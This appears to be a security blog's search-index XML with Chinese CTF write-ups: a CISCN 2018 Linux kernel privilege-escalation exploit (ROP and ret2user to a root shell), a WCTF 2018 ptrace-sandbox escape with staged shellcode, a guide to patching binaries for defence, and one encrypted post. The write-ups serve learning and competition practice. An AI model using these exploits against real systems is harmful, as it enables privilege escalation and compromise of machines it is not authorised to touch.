<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[【kernel pwn】CISCN 2018 CTF core题解]]></title>
    <url>%2F2018%2F07%2F13%2Fciscn2018-core%2F</url>
    <content type="text"><![CDATA[题目及相关文件下载，密码：914k 这是一道接近于libc的overflowme的题目了，调试还是比较麻烦，如果大佬们有好用的kernel用gdb插件麻烦告知我一下，环境好容易崩溃啊… core题目&amp;漏洞分析题目中注册了core_write、core_ioctl，而在core_ioctl中会根据参数去调用core_read、core_copy_func函数。 core_write: 用户可以向全局变量中写入一个不大于0x800的字符串内容 core_ioctl：分为3个case，维护了一个全局变量，当参数为0x6677889c的时候，可以设置这个变量，其余情况会分别调用core_read、core_copy_func函数 core_read：会根据core_ioctl维护的全局变量，从栈上读出长度为0x40的数据，这里很显然可以越界读数据，栈上的返回地址、canary之类的都可以读到 core_copy_func：会根据用户的输入长度，从name这个全局变量中向栈上读出数据。在判断时这个变量的类型是signed long long，而读出的时候变成了signed short，显然存在一个截断，当使用如0xf000000000000300这样的数据就可以绕过限制，造成内核的栈溢出。可以说是为了出题而出题了… 漏洞利用首先检查一下内核的安全保护机制，通过查看start.sh发现没有开启smep，开启了kalsr和canary的。所谓smep是内核为了避免ret2user的利用方法增加的一种保护方法，即内核代码不能跳转到用户空间去执行代码，绕过方法也很简单，使用内核的ROP就可以了，但此题由于没有这个保护，可以直接使用ret2user的攻击方法。 题目给出的目录结构是这样的： core.cpio：这是一个打包的文件，解包以后发现里面有文件系统，其中以vmlinux命名的是内核的二进制文件，core.ko是存在漏洞的驱动，也就是题目分析中分析的二进制文件。 start.sh： 启动脚本，标明启动的方法、保护措施等 bzImage：镜像文件 这里类比于libc中的pwn，感觉*.ko就是binary文件，vmlinux就是libc … 不同的是保护机制是由如何启动决定的。 内存地址泄露这个漏洞在分析中已经说过了，在ioctl中设置全局变量的值，然后利用core_read函数可以泄露栈上的数据： 首先先对core驱动下断点，断点的下法是，首先在qemu中查看/sys/module/core/sections/.text文件，找到镜像加载的基地址： 然后在gdb端，执行add-symbol-file ./core/core.ko 0xffffffffc03a0000 ，为驱动增加符号表 这样就可以下断点了，首先看一下再core_read的栈内容。 由于kernel pwn 的最终目的是提权到root，一种简单的方法是执行 1commit_creds(prepare_kernel_cred(0)); 而commit_creds、prapare_kernel_cred都是内核函数，在vmlinux中，因此还需要泄露vmlinux的基地址。 而在栈地址中并不能看出来哪个地址属于vmlinux，这里用一个应该算是复杂的方法吧。 首先找到这两个函数在vmlinux的偏移： 1234from pwn import *elf = ELF('./core/vmlinux')print "commit_creds",hex(elf.symbols['commit_creds']-0xffffffff81000000)print "prepare_kernel_cred",hex(elf.symbols['prepare_kernel_cred']-0xffffffff81000000) 在qemu里查看/proc/kallsyms中的 commit_creds 函数地址 而计算之后，找到vmlinux的基址： 12345Python 2.7.12 (default, Nov 20 2017, 18:23:56) [GCC 5.4.0 20160609] on linux2Type "help", "copyright", "credits" or "license" for more information.&gt;&gt;&gt; hex(0xffffffffba89c8e0-0x9c8e0)'0xffffffffba800000L' 可以发现在栈上有一条数据在vmlinux不远处，距离为0x9dd6d1 控制RIP能够泄露vmlinux、驱动和canary了以后，就变得比较容易了。 首先预先构造好ROP，使用core_write写入到全局变量name中备用。 执行ROPgadget –binary vmlinux &gt; 1.txt保存gadget备用，这个过程慢到令人发指… 而在core_copy_func中，构造长度为0xf000000000000300，即可成功覆盖RIP ROP构造其实，提取过程很容易，流程是： 1 执行 commit_creds(prepare_kernel_cred(0))，此时该进程已经是id为0的root进程了，但是仍在内核态中。而这条语句的执行可以用ROP来做，由于SMEP没开，ret2user也可以，ret2user就是在编写的程序中写入一个函数调用该函数，将ROP的该部分直接写成用户态函数的地址； 2 执行swapgs，准备回到用户态 3 iretq回到用户态，在rsp指向的位置布置好相关寄存器的值，特别的将rip寄存器的值保存为执行system(“/bin/sh”)，再返回用户态后就可以拿到一个root权限的shell了。 EXProp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/wait.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;pthread.h&gt;void setoff(int fd,long long size)&#123; ioctl(fd,0x6677889C,size);&#125;void core_read(int fd,char *buf)&#123; ioctl(fd,0x6677889b,buf);&#125;void core_copy_func(int fd,long long size)&#123; ioctl(fd,0x6677889a,size);&#125;unsigned long user_cs, user_ss, user_eflags,user_sp ;void save_stats() &#123; asm( "movq %%cs, %0\n" "movq %%ss, %1\n" "movq %%rsp, %3\n" "pushfq\n" "popq %2\n" :"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags),"=r"(user_sp) : : "memory" );&#125;void get_shell()&#123; system("/bin/sh");&#125;int main()&#123; int fd ; size_t tmp ; char buf[0x50]; size_t shellcode[0x100]; size_t vmlinux_base,canary,module_core_base; size_t commit_creds = 0x9c8e0; size_t prepare_kernel_cred = 0x9cce0; save_stats(); fd = open("/proc/core",O_RDWR); if(fd &lt; 0 )&#123; printf("Open /proc/core error!\n"); exit(0); &#125; setoff(fd,0x40); core_read(fd,buf); /* for test for(int i = 0;i&lt;8;i++)&#123; tmp = *(size_t *)(&amp;buf[i*8]); printf("[%d] %p\n",i,tmp); &#125; */ size_t pop_rdi = 0x000b2f; size_t push_rax = 0x02d112; size_t swapgs = 0x0d6; size_t iret ; size_t xchg = 0x16684f0; size_t call_rax=0x40398; size_t pop_rcx = 0x21e53; size_t pop_rbp = 0x3c4; //: pop rbp ; ret size_t pop_rdx = 0xa0f49 ;//: pop rdx ; ret size_t mov_rdi_rax_call_rdx = 0x01aa6a; vmlinux_base = (*(size_t *)(&amp;buf[4*8])-0x1dd6d1 ); printf("[+] vmlinux_base:%p\n",vmlinux_base); canary = (*(size_t *)(&amp;buf[0])); printf("[+] canary:%p\n",canary); module_core_base = (*(size_t *)(&amp;buf[2*8])-0x19b ); printf("[+] module_core_base:%p\n",module_core_base); commit_creds+=vmlinux_base; prepare_kernel_cred += vmlinux_base; pop_rdi += vmlinux_base; push_rax += vmlinux_base; swapgs += module_core_base ; iret = 0x50ac2+vmlinux_base; xchg += vmlinux_base; call_rax += vmlinux_base; pop_rcx += vmlinux_base; mov_rdi_rax_call_rdx +=vmlinux_base; pop_rdx += vmlinux_base; printf("[+] commit_creds:%p\n",commit_creds); printf("[+] prepare_kernel_cred:%p\n",prepare_kernel_cred); //shellcode[0]=shellcode[0] //shellcode[] = for(int i=0;i&lt;9;i++)&#123; shellcode[i]=canary; &#125; shellcode[9] = (*(size_t *)(&amp;buf[1]) ); shellcode[10] = pop_rdi; //0xdeadbeefdeadbeef; shellcode[11] = 0; shellcode[12] = prepare_kernel_cred; shellcode[13] = pop_rdx; shellcode[14] = pop_rcx; shellcode[15] = mov_rdi_rax_call_rdx; shellcode[16] = commit_creds; shellcode[17] = swapgs; shellcode[18] = shellcode; shellcode[19] = iret; shellcode[20] = (size_t)get_shell; shellcode[21] = user_cs; shellcode[22] = user_eflags; shellcode[23] = user_sp; shellcode[24] = user_ss; write(fd,shellcode,25*8); core_copy_func(fd,0xf000000000000000+25*8);&#125; ret2user1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;unsigned long user_cs, user_ss, user_eflags,user_sp ;void save_stats() &#123; asm( "movq %%cs, %0\n" "movq %%ss, %1\n" "movq %%rsp, %3\n" "pushfq\n" "popq %2\n" :"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags),"=r"(user_sp) : : "memory" );&#125;void get_shell(void)&#123; system("/bin/sh");&#125;//eip =(unsigned long long) get_shell;#define KERNCALL __attribute__((regparm(3)))void* (*prepare_kernel_cred)(void*) KERNCALL ;void (*commit_creds)(void*) KERNCALL ;void payload()&#123; commit_creds(prepare_kernel_cred(0));&#125;void setoff(int fd,int off)&#123; ioctl(fd,0x6677889C,off);&#125;void core_read(int fd,char *buf)&#123; ioctl(fd,0x6677889B,buf);&#125;void core_copy(int fd , unsigned long long len)&#123; ioctl(fd, 0x6677889A,len);&#125;int main(void)&#123; save_stats() ; unsigned long long buf[0x40/8]; memset(buf,0,0x40); unsigned long long canary ; unsigned long long module_base ; unsigned long long vmlinux_base ; unsigned long long iretq ; unsigned long long swapgs ; unsigned long long rop[0x30]; memset(buf,0,0x30*8); int fd = open("/proc/core",O_RDWR); if(fd == -1)&#123; printf("open file error\n"); exit(0); &#125; else&#123; printf("open file success\n"); &#125; printf("[*] buf: 0x%p",buf); setoff(fd,0x40); core_read(fd,buf); canary = buf[0]; module_base = buf[2] - 0x19b; vmlinux_base = buf[4] - 0x16684f0; printf("[*] canary: 0x%p",canary); printf("[*] module_base: 0x%p",module_base); printf("[*] vmlinux_base: 0x%p",vmlinux_base); commit_creds = vmlinux_base + 0x9c8e0; prepare_kernel_cred = vmlinux_base + 0x9cce0; iretq = vmlinux_base + 0x50ac2; swapgs = module_base + 0x0d6; rop[8] = canary ; rop[10] = payload; rop[11] = swapgs; rop[12] = 0; rop[13] = iretq ; rop[14] = get_shell ; rop[15] = user_cs; rop[16] = user_eflags; rop[17] = user_sp; rop[18] = user_ss; rop[19] = 0; write(fd,rop,0x30*8); core_copy(fd,0xf000000000000000+0x30*8);&#125; referencehttps://www.anquanke.com/post/id/86490 http://bobao.360.cn/learning/detail/3702.html]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
        <tag>KERNEL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【WCTF 2018】parrot_revenge 题解]]></title>
    <url>%2F2018%2F07%2F11%2FWCTF-2018%2F</url>
    <content type="text"><![CDATA[parrot_revenge题目解析题目给出了两个binary文件，分别是parent和parrot_revenge。 parent这是个沙箱程序，使用fork开辟了一个子进程，并用execve将parrot_revenge的子进程加载到当前的代码段，并用ptrace实现了对子进程的监控。 再看父进程，实现了一个对子进程的沙箱逻辑。具体实现在0x400a33这个函数中： 首先进行了沙箱的初始化，对于子进程将call malloc处的第一个字节由0xe8改为0xcc，并将原来的值存储起来，这样在子进程执行到call malloc处的时候就会产生一个中断，可以被父进程监听到。 当执行完成后，父进程会在一个死循环里监听子进程的系统调用，系统调用分为两种，第一种是父进程在初始化时对call malloc的0xcc中断，另外一种是程序正常调用的syscall中断。 对这两种中断分别的处理方法如下： 首先检查rip，即程序执行的地址是否为call malloc，进而检查是否执行的代码是0xcc，再检查程序rdi寄存器，也就是函数第一个参数是否在0x6f到0x1000范围内，如果是则rip-1，并恢复call malloc代码，再使用单步执行（singlestep）方法执行一条指令，再次保存call malloc地址指令，并重置为0xcc。 如不是，则检查系统调用号，当系统调用号不为0、1、9、12，则将子进程杀死。 parrot_revenge子进程的逻辑很简单，在while循环中循环执行操作，包括malloc、read、write，当控制的局部变量为1时，退出操作。 漏洞分析程序在父进程和子进程中均存在漏洞。 parrot_revenge在子进程中malloc过后，即向得到的地址+size处写\x00操作，这个漏洞和SUCTF 2018的noend题目一样，都未检查malloc函数的返回值，当size过大时，malloc会返回0，这样size+0取决于size，造成一个内存任意写一字节0的漏洞。 parent父进程中存在一个漏洞，这个漏洞在程序执行call malloc的ptrace(PTRACE_SINGLESTEP, pid, 0LL, 0LL);执行过后，会取得该处指令去更新保存的静态变量，当单步执行改变了call malloc处指令时，程序在下一次执行时就会执行非保存的call指令(\xe8)。 漏洞利用这个程序最开始以为是只有一次执行的，因为无法预知栈地址，不能找到程序的循环次数变量来覆写，就很尴尬。一度以为没法做。 在赛场测试中无意发现，当size取0x4007ae时，会向cmp eax,1处写0，造成程序在while循环中无限循环… 但是在本地却无法更改，没有搭起本地调试环境。 环境搭建在赛后与主办方交流时候发现，其实这题在题目描述中给了hint来搭建本地环境。 在题目中提示： 1Env : Linux DESKTOP-ES068S3 4.4.0-17134-Microsoft #81-Microsoft Sun May 20 01:14:00 PST 2018 x86_64 x86_64 x86_64 GNU/Linux 这代表是Windows10操作系统的ubuntu子系统，在比赛结束后，我根据这篇博客里所述的操作搭建起了环境，注意选择应用商店中的ubuntu 16.04。在搭建好环境后，我使用gdb挂起程序，发现了linux和Windows子系统环境的不同，在Windows的子系统中被ptrace子程序的代码段是rwx的，而linux中是r-x的，这也是赛场环境中可以改代码段的原因。 Ubuntu 16.04 Window10子系统ubuntu 16.04 任意代码执行在比赛时发现了代码段可以改时，我们进行了疯狂测试，发现全部代码段都是可以改的，只要保证程序汇编指令不崩溃。 首先我们发现程序主要识别变量的方法是mov rax,[rbp+size]及mov [rbp+size],rax。而size这个变量是单字节表示的，当size=0时，即mov [rbp+0],rax。而在main函数中，rbp指向的内容是_libc_csu_init函数的地址，是在.text段上的0x4007C0位置 而这个位置位于main函数的高地址部分。 当修改下图中的ptr变量，即可在每次函数写时，向_libc_csu_init写入内容。 注意到函数的exit(0)调用使用的汇编语句是 e8 82 fd ff ff ff 这样的call指令跳转方法是用的相对偏移来定的，当我们向该位置写\x00使这条指令变成 e8 82 00 00 00时，就变成了调用当前eip（0x4007be）+0x82的位置——0x400840，而这个位置恰好在0x4007c0的高地址位置，也就是说我们可以先向这个位置写汇编指令，再退出就可以跳转拿到我们预先布置的shellcode上了。 还需要解决如何退出的问题，我们之前用cmp rax，0来保证程序循环，我们将 中红框两处代码均改为[rbp+0]，即可达到效果，上述改动需要保证一定的顺序，使得程序不崩溃。 1234567891011121314151617181920212223242526def malloc(len,content): p.recvuntil('ize:') p.sendline(str(len)) p.recvuntil('Buffer:') p.send(content)#'4196270'def malloc2(len,content): p.recvuntil('Size:') p.sendline(str(len)) p.recvuntil('Buffer:') #p.send(content)# cmp 0malloc(0x4007AE,'')# exit 0*3malloc(0x4007B9 + 5,'')malloc(0x4007B8 + 5,'')malloc(0x4007B7 + 5,'')malloc(0x4007A5,'')malloc(0x400789,'')malloc(0x400762,'')core = shellcraft.amd64.write(1, 'input:', 0x10) + shellcraft.amd64.read(0,0x400700,0x100) + "mov rax,0x400700\njmp rax\n" shellcode = asm('lab1 : ' + core +'nop\n' * (0x80 - len(asm(core,arch = 'amd64'))) + 'jmp lab1', arch = 'amd64')malloc(0x150, shellcode)p.recvuntil('Buffer:')malloc(0x400736,'')malloc(0,'') 这样可以执行我们写入的core代码。 沙箱逃逸注意到程序本身存在一个ptrace沙箱，只能执行部分系统调用，可以执行的系统调用时read、write、mmap、exit显然不能拿到flag，比赛结束前我们就卡在这里… 在比赛结束后，听了出题队伍的分享，根据里面的hint做出了沙箱逃逸的部分（PPT照片在最后） 首先，利用的漏洞就是漏洞分析中提到的，当单步执行的代码会改变该条指令时，即可在下一次执行时改变执行的语句。由于singlestep仅能执行一条指令，所以再执行该条指令时需对执行进行自修改。 第一次保存的代码是\xe8，即call指令，而call执行时会在栈上push一个返回地址，当将栈指向当前指令执行位置时，可以将该条指令改变，此次将其改变为\x00，shellcode布置如下： 12345678910110x400700 mov rdi,0x70 #绕过rdi的范围检查 mov r9,0x40073e xchg rsp,r9 nop nop ; padding0x40073D \xcc\x00\x00\x00\x00 #在实际运行时会变成call 0x0也就是push返回地址，并继续向下执行0x400742 mov r9,0x601200 xchg rsp,r9 shellcraft.amd64.write(1,&quot;step 1&quot;,0x6) shellcraft.amd64.read(0,0x400700,0x100) mov rax,0x400700 jmp rax 在这轮完成后，程序保存在0x40073d位置的指令从\xe8变成了\x00 我们的目标是执行syscall（\x0f\x05），因此需要在下一次执行时，将\x00变成\x0f 在一阶段的shellcode中已经构成了输入循环，因此可以再次布置二阶段的shellcode，如下： 12345678910110x400700 mov rdi,0x70 #绕过rdi的范围检查 mov al,0x0f mov rcx,0x40073D nop nop ; padding0x40073D \xcc\x41\x00\x90\x90 #在实际运行时会变成00 41 00 也就是 add byte ptr[rcx+0x0],al0x400742 mov r9,0x601200 xchg rsp,r9 shellcraft.amd64.write(1,&quot;step 1&quot;,0x6) shellcraft.amd64.read(0,0x400700,0x100) mov rax,0x400700 jmp rax 这时，保存的\x00变成了\x0f，下一阶段就可以在此处调用syscall了。 由于父进程对该处的rdi有检查，execve(‘/bin/sh’,0,0)和open(‘/home/chall/flag.txt’,0)就无法调用了，此处调用openat(0x70,”/home/chall/flag.txt”,0)，这个函数第一个参数是文件夹指针，而当第二个参数是绝对路径时无视该指针，与open相同，shellcode3布置为： 123456780x400700 shellcraft.amd64.openat(0x70,&quot;/home/p4nda/flag.txt&quot;,0)[:-2] nop nop ; padding0x40073D \xcc\x05\x90\x90\x90 #在实际运行时会变成00 41 00 也就是 add byte ptr[rcx+0x0],al0x400742 mov r9,0x601900 xchg rsp,r9 xchg rsp,r9 shellcraft.amd64.read(3,0x601200,0x100) shellcraft.amd64.write(1,0x601200,0x100) 即可读出flag，由于在本地测试，flag是我随手写的： EXP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#! /usr/bin/env python# -*- coding: utf-8 -*-from pwn import *#from pwnlib.util.iters import bruteforce# socat TCP4-LISTEN:10001,fork EXEC:"./parent.org ./parrot_revenge"import stringcontext.log_level="debug"debug = 1if debug : p = remote('10.101.168.102',10001)else: p = remote('172.16.13.222',31337)##p=process(['./parent','./parrot_revenge'] )elf = ELF('./parrot_revenge')def malloc(len,content): p.recvuntil('ize:') p.sendline(str(len)) p.recvuntil('Buffer:') p.send(content)#'4196270'def malloc2(len,content): p.recvuntil('Size:') p.sendline(str(len)) p.recvuntil('Buffer:') #p.send(content)# cmp 0malloc(0x4007AE,'')# exit 0*3malloc(0x4007B9 + 5,'')malloc(0x4007B8 + 5,'')malloc(0x4007B7 + 5,'')malloc(0x4007A5,'')malloc(0x400789,'')malloc(0x400762,'')core = shellcraft.amd64.write(1, 'input:', 0x10) + shellcraft.amd64.read(0,0x400700,0x100) + "mov rax,0x400700\njmp rax\n" #+ shellcraft.amd64.openat(-3,'/home/p4nda/flag.txt', 0)#shellcraft.amd64.openat('/home/p4nda/flag.txt', 0)shellcode = asm('lab1 : ' + core +'nop\n' * (0x80 - len(asm(core,arch = 'amd64'))) + 'jmp lab1', arch = 'amd64')print len(shellcode)malloc(0x150, shellcode)p.recvuntil('Buffer:')malloc(0x400736,'')malloc(0,'')# set save_op 0x00shellcode1 = "mov rdi,0x70\nmov r9,0x40073e\nxchg rsp,r9\n"# +shellcraft.amd64.read(0,0x400700,0x100)asm_shellcode1 = asm(shellcode1,arch='amd64')asm_shellcode1 = asm_shellcode1.ljust(0x40073D-0x400700,'\x90')asm_shellcode1 += "\xcc\x00\x00\x00\x00"shellcode1 = "mov r9,0x601200\nxchg rsp,r9\n"+ shellcraft.amd64.write(1,"step 1",0x6) + shellcraft.amd64.read(0,0x400700,0x100) +"mov rax,0x400700\njmp rax\n"asm_shellcode1 += asm(shellcode1,arch="amd64")p.recvuntil('input:')p.send(asm_shellcode1)# set save_op 0xf0shellcode2 = "mov rdi,0x70\nmov al,0x0f\nmov rcx,0x40073D\n"asm_shellcode2 = asm(shellcode2,arch='amd64')asm_shellcode2 = asm_shellcode2.ljust(0x40073D-0x400700,'\x90')asm_shellcode2 += "\xcc\x41\x00\x90\x90"shellcode2 = "mov r9,0x601200\nxchg rsp,r9\n"+ shellcraft.amd64.write(1,"step 2",0x6) + shellcraft.amd64.read(0,0x400700,0x100) +"mov rax,0x400700\njmp rax\n"asm_shellcode2 += asm(shellcode2,arch="amd64")p.recvuntil('step 1')p.send(asm_shellcode2)#openat(0x70,"flag.txt",0)shellcode3 = shellcraft.amd64.openat(0x70,"/home/p4nda/flag.txt",0)asm_shellcode3 = asm(shellcode3,arch='amd64')[:-2]asm_shellcode3 = asm_shellcode3.ljust(0x40073D-0x400700,'\x90')asm_shellcode3 += "\xcc\x05\x90\x90\x90"shellcode3 = "mov r9,0x601900\nxchg rsp,r9\n" +shellcraft.amd64.read(3,0x601200,0x100)+ shellcraft.amd64.write(1,0x601200,0x100) #+ shellcraft.amd64.write(1,0x601200,0x100)asm_shellcode3+= asm(shellcode3,arch="amd64")p.recvuntil('step 2')p.send(asm_shellcode3)p.interactive() 参考TokyoWesterns的ppt]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF线下赛中常用的PWN题patch方法]]></title>
    <url>%2F2018%2F07%2F02%2Fpatch-in-pwn%2F</url>
    <content type="text"><![CDATA[在国赛以后，突然发现对PWN题中的patch方法了解不太深入，尤其是不够优雅，经常就用IDA直接手改了，或者就是用加一个section的方法，导致patch后的文件改动很大，尤其是在国赛中，被主办方打电话过来问是不是加了通防，本文就简单介绍一下常用的patch方法。 IDAIDA Pro是一个非常强大的工具，其中包含了对汇编指令修改的功能。 以国赛华北赛区的半决赛为例，其中有一道PWN2是一个栈溢出，代码是这样的。 很显然，在read这里有一个明显的栈溢出，修复漏洞的方法也和容易，将这个值改小成0x138就好了，下面的write也一样的改法。 这里使用IDA默认的修改插件来改，在Edit-Patch Program目录下，首先切换到IDA View-A这个汇编指令界面，并选中要改的汇编指令行: 选择Assemble/Change byte/Change word都可以，以Assemble为例在Instruction窗口，将mov edx, 1cch改为mov edx, 138h。 此时，切换到类C语言窗口可以看到该行已经被修改为了read(a1, &amp;s, 0x138uLL); 但并没有完，这仅仅修改了IDA对于该文件的数据库，并没有应用到文件中去，同样在Edit-Patch Program目录下，选择Apply patches into file…，将修改写入文件，就完成了一道简单题目的patch。 这种方法完全依靠手动，而且不能修改文件结构，可以供手动修改的位置也很少，一旦出现如UAF等悬垂指针的问题基本就很难解决了，还得依靠其他更有力的方法来解决。 lieflief是一个开源的跨平台的可执行文件修改工具，链接如下： 1https://github.com/lief-project/LIEF 对外提供了Python、C++、C的接口。 对于Python库安装可以使用pip，如 1sudo pip install lief 对于lief的API和用法就不介绍了，RTFM。 1https://lief.quarkslab.com/doc/latest/api/python/index.html 以下是几种可行的patch方法 增加segment这个方法的目的是增加一个程序段，在这个程序段中加入一个修复漏洞的程序代码，一般程序会在call某个函数时触发漏洞，一般语句为call 0x8041234，可以劫持这句话的逻辑，改成call我们定义的修复函数。 首先我们的代码程序如下： 123456789#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char** argv) &#123; printf("/bin/sh%d",102); puts("let's go\n"); printf("/bin/sh%d",102); puts("let's gogo\n"); return EXIT_SUCCESS;&#125; 我们想把第一处printf修改掉，改成我们自己的逻辑，首先需要编译一个包含实现patch函数的静态库，比如： 123456789101112131415161718192021222324void myprintf(char *a,int b)&#123; asm( "mov %rdi,%rsi\n" "mov $0,%rdi\n" "mov $0x20,%rdx\n" "mov $0x1,%rax\n" "syscall\n" );&#125;void myputs(char *a)&#123; asm( "push $0x41414141\n" "push $0x42424242\n" "push %rsp\n" "pop %rsi\n" "mov $0,%rdi\n" "mov $0x20,%rdx\n" "mov $0x1,%rax\n" "syscall\n" "pop %rax\n" "pop %rax\n" );&#125;//gcc -Os -nostdlib -nodefaultlibs -fPIC -Wl,-shared hook.c -o hook 如上，将printf改成了write(0,”/bin/sh%d”,0x20)，利用注释的gcc命令将其编译。 patch程序的流程是首先将代码段加入到binary程序中，然后修改跳转逻辑，将call printf@plt，改成call myprintf。 lief中提供了add参数可以用于为二进制文件增加段： 123binary = lief.parse(binary_name)lib = lief.parse(lib_name) segment_add = binary.add(lib.segments[0]) 在修改跳转语句部分，由程序的call执行寻址方法是相对寻址的，即call addr = EIP + addr 因此需要计算写入的新函数距离要修改指令的偏移，计算方法如下： 1call xxx =(addr of new segment + offset function ) - (addr of order + 5 /*length of call xx*/) 由于偏移地址是补码表示的，因此在用python计算时需要对结果异或0xffffffff，最终patch计算函数如下： 1234567def patch_call(file,where,end,arch = "amd64"): print hex(end) length = p32((end - (where + 5 )) &amp; 0xffffffff) order = '\xe8'+length print disasm(order,arch=arch) file.patch_address(where,[ord(i) for i in order]) 执行之后可以看到patch成功了， 但是一个重大的问题是patch前后文件大小改动很大： 1234567┌─[p4nda@p4nda-virtual-machine] - [~/Desktop/pwn/patch] - [一 7月 02, 20:36]└─[$] &lt;&gt; python 1.py0x8022f9 0: e8 70 1d 40 00 call 0x401d75[+] ori size 8656[+] patch size 15885[+] Seccessful patched in adding segment 这样在一些线下赛中很容易由于修改过大和被判定为通防或者宕机。 增加library这是借鉴LD_preload的一种思路，当程序中加载两个库时，在调用某一函数在两个库内同名存在时，是有一定查找顺序的，也就是可以实现，在不修改程序正常代码的前提下，对全部libc函数进行hook。如下例： 12345int __cdecl main(int argc, const char **argv, const char **envp)&#123; printf("/bin/sh%d", 102LL, envp, argv); return 0;&#125; 编译一个动态链接库 12345678910111213141516171819202122//#include "/home/p4nda/linux-4.17.3/lib/syscall.c"#define _GNU_SOURCE//#include &lt;stdio.h&gt;#include &lt;sys/stat.h&gt;#include &lt;unistd.h&gt;#include &lt;dlfcn.h&gt;// gcc -nostdlib -nodefaultlibs -fPIC -Wl,-shared patch.c -o patch -ldlint printf(char *a,int b) &#123; char str[] = "hacked by me\n "; //puts(a); if(strstr(a,"/bin/sh"))&#123; puts("find dangerous str~"); &#125; int (*old_printf)(char *,int); old_printf =(int (*)(char *,int)) dlsym(RTLD_NEXT, "printf"); old_printf(a,b); puts("\n");&#125; 编译命令在注释中，则每次printf时都会先执行上述库中的函数，达到hook的目的。 优势很明显，可以执行任意libc内函数代码，让编程更容易。 不过缺点也很明显，首先程序变得巨大，并且当不存在这个静态链接库的时候，程序跑不起来… 有些线下赛都是本地check的，比如*网杯，很容易就判断宕机了… 修改程序.eh_frame段在TSCTF 2018 Final时，我在NeSE战队的binary文件中找到了通防工具，但是程序改动并没有特别大，当时感觉很好奇，在赛后调试了一下，发现他们把通防的shellcode写在了一个叫.eh_frame的段中，这个段会加载到程序中来，并且自身带有可执行权限，在查找这个段用处时，发现该段对程序执行影响不大，故可以将patch代码写在这个段中，再用跳转的方法将程序逻辑劫持到这里来。 可以看到在patch前后，程序大小保持不变。 缺点同样明显，.eh_frame的大小是有限的… 综上，似乎没有比较简洁的通用方法，综合着来用吧….]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【PWNABLE.TW】 wannaheap 解题思路]]></title>
    <url>%2F2018%2F06%2F28%2Fpwnable-tw-wannaheap%2F</url>
    <content type="text"><![CDATA[Enter password to read. Incorrect Password! No content to display! U2FsdGVkX1+ispUymK/dsnywHg3pGlo+FBVyfTzuliR/1ZnNMZU8GFApuY6B33pzvUj4Bi8B4ZGPN4t/AZYs6uHAHM2KIcs9hokb3fOlqfLH4EhBqkrXgTx+BDUGK2YloPxdLJr3LUK0h0j8uj19j3AJJrZR61i07bLq52jyZR7medUxpDcqcbsDbZzUs3FkSD6Y0CZuvn+0iAedjWLYylX8ihu2F7ki724rqmFQRaBZQJivsQ5Q3Ko44w3KDl02fn4IxzZ4X1wERVy1epRB38xPb7FKA6PmMgWUEALiRzKefIWwdFRCTg6patsCzlHxYCBZ9YH1hr9ZLYf0iVZWWzoqaR8QYGJpaGqtLtamctqkEL6cHxyW/TalNly5A3nxSDuX+JpMWroFPIV0F7jewQugDZjas7iOuhGCzIVx8XwO5mK4iAdE+DyaZEG2nYC8plMDMUv/jsQ2eH07J+MaHVzi3m+vq5dRR3nK2uwh0lszSwXhHjCsVe2ScyofE1HJB10W7AWgxkryRfj3G/Zs9EFQIauDd8sCFLvYC6kd8LJwlGkkuPQG4WJ8mJ77nPjfgwH2UDaxqSpAtbD+O3yUikHkM73tcYpQAmmPkBsKKkSit997XKyRGTGYSSs+mjrJDCjR5Yi3irW1RWiDPT9jrxuOa6vkLd9FIwAsPu7j0E5Axvdigf6ZpK40/l9BFKvWOh/3qq9c4yMRmnqzLcIEN342ZroSuETxiY4lZE8k0NsBADKGxMFyZbwkxf2pFYYEPYYcC1b1bo+MXq9eMDhyq+eyAeT0pRXD7zJwPgqaid7PvEP7CnRPYfmP5n0EWd1IMvUcXHuBP/TMEo+AjaSowjAEQ20R5wS9lsC9H+Y6ECX2a4PWX9lvUVyCimtdFo1BK52ARyMejJy53NJAMbgEpmvj9Rv9G2z1yhxckZcU0USHaX59tlC3xj3e3GVfgZ61yxlSgNYi4hxyZ2185uHZ71WmBcCnmzmC5tN0oBexXFSHLUzohkwo4urCgW7D96DyA4ocJAaOMwctDpqKLuLk05EX1V8t19mKDY3qapQexqTB0N4l7BBJ6VZcA8AlGIxQnEcLsXkC2elql7KFJ6/Yx5iTmnX0yLvXJIQdm+Ugsk3YSx1Nq4owtg3aEr1+qxZ/To2Q8wayT82chw2aF2UAoY5beGYbaZgejbb8kyAYh9h68/VBFLTITUI65hmCq8FQQtJJmYUYaKdH0DAV6aSXr73caHiWjiNbHIhKeBoxp9DmdTzZe+XIqSFvNfpySRW48jL4fBgsTLo91kBc4+7dT5p92WUS67dKDeWRjdzZsDWjPqWXwU2kIopg4Fovtj/9+wH/kdLNATrf8aQvufA7i5CPC2npl29pyPjJAQ/WuPgupaIsaJKdYlnQQ1jJpB0S6z9hpTIZK9BySrN+qxbGJPHhy24kZuPdJaGsdhbiMRBwWv9UIi86wIUD8HMhBrybfRizfejYq6BISMe3j35dauLKQ/54bIcXtP4aXQaFLp02adwihfk3SbQVahZ/npnppiteU9euKWH8VAbjcrS1Qnr+6nB6KFrKeSzMdo3fOovMpvnKtyQOfLuIFUos3oatPTnQQCQvZRsdWxK045VA